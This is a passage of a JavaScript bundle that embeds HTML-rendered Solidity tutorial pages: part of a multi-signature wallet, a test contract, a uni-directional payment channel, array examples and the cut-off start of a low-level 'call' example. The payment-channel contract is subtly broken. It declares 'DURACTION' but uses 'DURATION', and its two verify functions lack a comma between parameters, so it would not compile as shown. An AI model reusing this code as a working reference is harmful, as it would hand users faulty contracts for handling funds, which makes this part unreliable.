class=\"hljs-keyword\">_</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">txExists</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _txIndex</span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(_txIndex &lt; transactions.<span class=\"hljs-built_in\">length</span>, <span class=\"hljs-string\">\"tx does not exist\"</span>);\n        <span class=\"hljs-keyword\">_</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">notExecuted</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _txIndex</span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(!transactions[_txIndex].executed, <span class=\"hljs-string\">\"tx already executed\"</span>);\n        <span class=\"hljs-keyword\">_</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">notConfirmed</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _txIndex</span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(!isConfirmed[_txIndex][<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>], <span class=\"hljs-string\">\"tx already confirmed\"</span>);\n        <span class=\"hljs-keyword\">_</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span>[] <span class=\"hljs-keyword\">memory</span> _owners, <span class=\"hljs-keyword\">uint</span> _numConfirmationsRequired</span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(_owners.<span class=\"hljs-built_in\">length</span> &gt; <span class=\"hljs-number\">0</span>, <span class=\"hljs-string\">\"owners required\"</span>);\n        <span class=\"hljs-built_in\">require</span>(\n            _numConfirmationsRequired &gt; <span class=\"hljs-number\">0</span> &amp;&amp; _numConfirmationsRequired &lt;= _owners.<span class=\"hljs-built_in\">length</span>,\n            <span class=\"hljs-string\">\"invalid number of required confirmations\"</span>\n        );\n\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; _owners.<span class=\"hljs-built_in\">length</span>; i++) {\n            <span class=\"hljs-keyword\">address</span> owner = _owners[i];\n\n            <span class=\"hljs-built_in\">require</span>(owner != <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">0</span>), <span class=\"hljs-string\">\"invalid owner\"</span>);\n            <span class=\"hljs-built_in\">require</span>(!isOwner[owner], <span class=\"hljs-string\">\"owner not unique\"</span>);\n\n            isOwner[owner] = <span class=\"hljs-literal\">true</span>;\n            owners.<span class=\"hljs-built_in\">push</span>(owner);\n        }\n\n        numConfirmationsRequired = _numConfirmationsRequired;\n    }\n\n    <span class=\"hljs-keyword\">receive</span>() <span class=\"hljs-keyword\">payable</span> <span class=\"hljs-keyword\">external</span> {\n        <span class=\"hljs-keyword\">emit</span> Deposit(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>, <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">submitTransaction</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _to, <span class=\"hljs-keyword\">uint</span> _value, <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> _data</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n        <span class=\"hljs-title\">onlyOwner</span>\n    </span>{\n        <span class=\"hljs-keyword\">uint</span> txIndex = transactions.<span class=\"hljs-built_in\">length</span>;\n\n        transactions.<span class=\"hljs-built_in\">push</span>(Transaction({\n            to: _to,\n            <span class=\"hljs-built_in\">value:</span> _value,\n            data: _data,\n            executed: <span class=\"hljs-literal\">false</span>,\n            numConfirmations: <span class=\"hljs-number\">0</span>\n        }));\n\n        <span class=\"hljs-keyword\">emit</span> SubmitTransaction(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, txIndex, _to, _value, _data);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">confirmTransaction</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _txIndex</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n        <span class=\"hljs-title\">onlyOwner</span>\n        <span class=\"hljs-title\">txExists</span>(<span class=\"hljs-params\">_txIndex</span>)\n        <span class=\"hljs-title\">notExecuted</span>(<span class=\"hljs-params\">_txIndex</span>)\n        <span class=\"hljs-title\">notConfirmed</span>(<span class=\"hljs-params\">_txIndex</span>)\n    </span>{\n        Transaction <span class=\"hljs-keyword\">storage</span> transaction = transactions[_txIndex];\n        transaction.numConfirmations += <span class=\"hljs-number\">1</span>;\n        isConfirmed[_txIndex][<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] = <span class=\"hljs-literal\">true</span>;\n\n        <span class=\"hljs-keyword\">emit</span> ConfirmTransaction(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, _txIndex);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">executeTransaction</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _txIndex</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n        <span class=\"hljs-title\">onlyOwner</span>\n        <span class=\"hljs-title\">txExists</span>(<span class=\"hljs-params\">_txIndex</span>)\n        <span class=\"hljs-title\">notExecuted</span>(<span class=\"hljs-params\">_txIndex</span>)\n    </span>{\n        Transaction <span class=\"hljs-keyword\">storage</span> transaction = transactions[_txIndex];\n\n        <span class=\"hljs-built_in\">require</span>(\n            transaction.numConfirmations &gt;= numConfirmationsRequired,\n            <span class=\"hljs-string\">\"cannot execute tx\"</span>\n        );\n\n        transaction.executed = <span class=\"hljs-literal\">true</span>;\n\n        (<span class=\"hljs-keyword\">bool</span> success, ) = transaction.to.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> transaction.<span class=\"hljs-built_in\">value</span>}(transaction.data);\n        <span class=\"hljs-built_in\">require</span>(success, <span class=\"hljs-string\">\"tx failed\"</span>);\n\n        <span class=\"hljs-keyword\">emit</span> ExecuteTransaction(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, _txIndex);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">revokeConfirmation</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _txIndex</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n        <span class=\"hljs-title\">onlyOwner</span>\n        <span class=\"hljs-title\">txExists</span>(<span class=\"hljs-params\">_txIndex</span>)\n        <span class=\"hljs-title\">notExecuted</span>(<span class=\"hljs-params\">_txIndex</span>)\n    </span>{\n        Transaction <span class=\"hljs-keyword\">storage</span> transaction = transactions[_txIndex];\n\n        <span class=\"hljs-built_in\">require</span>(isConfirmed[_txIndex][<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>], <span class=\"hljs-string\">\"tx not confirmed\"</span>);\n\n        transaction.numConfirmations -= <span class=\"hljs-number\">1</span>;\n        isConfirmed[_txIndex][<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] = <span class=\"hljs-literal\">false</span>;\n\n        <span class=\"hljs-keyword\">emit</span> RevokeConfirmation(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, _txIndex);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getOwners</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span>[] <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> owners;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getTransactionCount</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> transactions.<span class=\"hljs-built_in\">length</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getTransaction</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _txIndex</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span>\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> to, <span class=\"hljs-keyword\">uint</span> value, <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> data, <span class=\"hljs-keyword\">bool</span> executed, <span class=\"hljs-keyword\">uint</span> numConfirmations</span>)\n    </span>{\n        Transaction <span class=\"hljs-keyword\">storage</span> transaction = transactions[_txIndex];\n\n        <span class=\"hljs-keyword\">return</span> (\n            transaction.to,\n            transaction.<span class=\"hljs-built_in\">value</span>,\n            transaction.data,\n            transaction.executed,\n            transaction.numConfirmations\n        );\n    }\n}\n</code></pre>\n<p>Here is a contract to test sending transactions from the multi-sig wallet</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">TestContract</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> i;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">callMe</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> j</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        i += j;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getData</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodeWithSignature</span>(<span class=\"hljs-string\">\"callMe(uint256)\"</span>, <span class=\"hljs-number\">123</span>);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Uni-Directional Payment Channel\"\nexport const description = \"An example of uni-directional payment channels in Solidity\"\n\nconst html = `<p>Payment channels allow participants to repeatedly transfer Ether off chain.</p>\n<p>Here is how this contract is used:</p>\n<ul>\n<li><code>Alice</code> deploys the contract, funding it with some Ether.</li>\n<li><code>Alice</code> authorizes a payment by signing a message (off chain) and sends the signature to <code>Bob</code>.</li>\n<li><code>Bob</code> claims his payment by presenting the signed message to the smart contract.</li>\n<li>If <code>Bob</code> does not claim his payment, <code>Alice</code> get her Ether back after the contract expires</li>\n</ul>\n<p>This is called a uni-directional payment channel since the payment can go only in a signle direction from <code>Alice</code> to <code>Bob</code>.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol\"</span>;\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/utils/ReentrancyGuard.sol\"</span>;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">UniDirectionalPaymentChannel</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">ReentrancyGuard</span> </span>{\n    <span class=\"hljs-keyword\">using</span> <span class=\"hljs-title\">ECDSA</span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">for</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">bytes32</span></span>;\n\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> <span class=\"hljs-keyword\">public</span> sender;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> <span class=\"hljs-keyword\">public</span> receiver;\n\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">constant</span> DURACTION = <span class=\"hljs-number\">7</span> * <span class=\"hljs-number\">24</span> * <span class=\"hljs-number\">60</span> * <span class=\"hljs-number\">60</span>;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> expiresAt;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _receiver</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(_receiver != <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">0</span>), <span class=\"hljs-string\">\"receiver = zero address\"</span>);\n        sender = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n        receiver = _receiver;\n        expiresAt = <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span> + DURATION;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_getHash</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">private</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>) </span>{\n        <span class=\"hljs-comment\">// <span class=\"hljs-doctag\">NOTE:</span> sign with address of this contract to protect agains</span>\n        <span class=\"hljs-comment\">// replay attack on other contracts</span>\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>), _amount));\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getHash</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> _getHash(_amount);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_getEthSignedHash</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">private</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> _getHash(_amount).toEthSignedMessageHash();\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getEthSignedHash</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> _getEthSignedHash(_amount);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_verify</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> _sig</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">private</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> _getEthSignedHash(_amount).recover(_sig) == sender;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">verify</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> _sig</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> _verify(_amount, _sig);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">close</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount, <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> _sig</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\">nonReentrant</span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span> == receiver, <span class=\"hljs-string\">\"!receiver\"</span>);\n        <span class=\"hljs-built_in\">require</span>(_verify(_amount, _sig), <span class=\"hljs-string\">\"invalid sig\"</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = receiver.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> _amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n        <span class=\"hljs-built_in\">selfdestruct</span>(sender);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">cancel</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span> == sender, <span class=\"hljs-string\">\"!sender\"</span>);\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span> &gt;= expiresAt, <span class=\"hljs-string\">\"!expired\"</span>);\n        <span class=\"hljs-built_in\">selfdestruct</span>(sender);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Array\"\nexport const description = \"Learn about arrays in Solidity\"\n\nconst html = `<p>Array can have a compile-time fixed size or a dynamic size.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Array</span> </span>{\n    <span class=\"hljs-comment\">// Several ways to initialize an array</span>\n    <span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">public</span> arr;\n    <span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">public</span> arr2 = [<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>];\n    <span class=\"hljs-comment\">// Fixed sized array, all elements initialize to 0</span>\n    <span class=\"hljs-keyword\">uint</span>[<span class=\"hljs-number\">10</span>] <span class=\"hljs-keyword\">public</span> myFixedSizeArr;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> i</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> arr[i];\n    }\n\n    <span class=\"hljs-comment\">// Solidity can return the entire array.</span>\n    <span class=\"hljs-comment\">// But this function should be avoided for</span>\n    <span class=\"hljs-comment\">// arrays that can grow indefinitely in length.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getArr</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> arr;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">push</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> i</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Append to array</span>\n        <span class=\"hljs-comment\">// This will increase the array length by 1.</span>\n        arr.<span class=\"hljs-built_in\">push</span>(i);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">pop</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Remove last element from array</span>\n        <span class=\"hljs-comment\">// This will decrease the array length by 1</span>\n        arr.<span class=\"hljs-built_in\">pop</span>();\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getLength</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> arr.<span class=\"hljs-built_in\">length</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">remove</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> index</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Delete does not change the array length.</span>\n        <span class=\"hljs-comment\">// It resets the value at index to it&#x27;s default value,</span>\n        <span class=\"hljs-comment\">// in this case 0</span>\n        <span class=\"hljs-keyword\">delete</span> arr[index];\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">CompactArray</span> </span>{\n    <span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">public</span> arr;\n\n    <span class=\"hljs-comment\">// Deleting an element creates a gap in the array.</span>\n    <span class=\"hljs-comment\">// One trick to keep the array compact is to</span>\n    <span class=\"hljs-comment\">// move the last element into the place to delete.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">remove</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> index</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Move the last element into the place to delete</span>\n        arr[index] = arr[arr.<span class=\"hljs-built_in\">length</span> - <span class=\"hljs-number\">1</span>];\n        <span class=\"hljs-comment\">// Remove the last element</span>\n        arr.<span class=\"hljs-built_in\">pop</span>();\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">test</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        arr.<span class=\"hljs-built_in\">push</span>(<span class=\"hljs-number\">1</span>);\n        arr.<span class=\"hljs-built_in\">push</span>(<span class=\"hljs-number\">2</span>);\n        arr.<span class=\"hljs-built_in\">push</span>(<span class=\"hljs-number\">3</span>);\n        arr.<span class=\"hljs-built_in\">push</span>(<span class=\"hljs-number\">4</span>);\n        <span class=\"hljs-comment\">// [1, 2, 3, 4]</span>\n\n        remove(<span class=\"hljs-number\">1</span>);\n        <span class=\"hljs-comment\">// [1, 4, 3]</span>\n\n        remove(<span class=\"hljs-number\">2</span>);\n        <span class=\"hljs-comment\">// [1, 4]</span>\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Call\"\nexport const description = \"In Solidity call is a low level function to interact with other contracts\"\n\nconst html = `<p><code>call</code> is a low level function to interact with other contracts.</p>\n<p>This is the recommended method to use when you&#39;re just sending Ether via calling the <code>fallback</code> function.</p>\n<p>However it is not the recommend way to call existing functions.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Receiver</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Received</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> caller, <span class=\"hljs-keyword\">uint</span> amount, <span class=\"hljs-keyword\">string</span> message</span>)</span>;\n\n    <span class=\"hljs-keyword\">receive</span>() <span class=\"hljs-keyword\">external</span> <span class=\"hljs-keyword\">payable</span> {\n        <span class=\"hljs-keyword\">emit</span> Received(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>, <span class=\"hljs-string\">\"Fallback was called\"</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _message, <span class=\"hljs-keyword\">uint</span> _x</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">emit</span> Received(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>, _message);\n\n        <span class=\"hljs-keyword\">return</span> _x + <span class=\"hljs-number\">1</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> 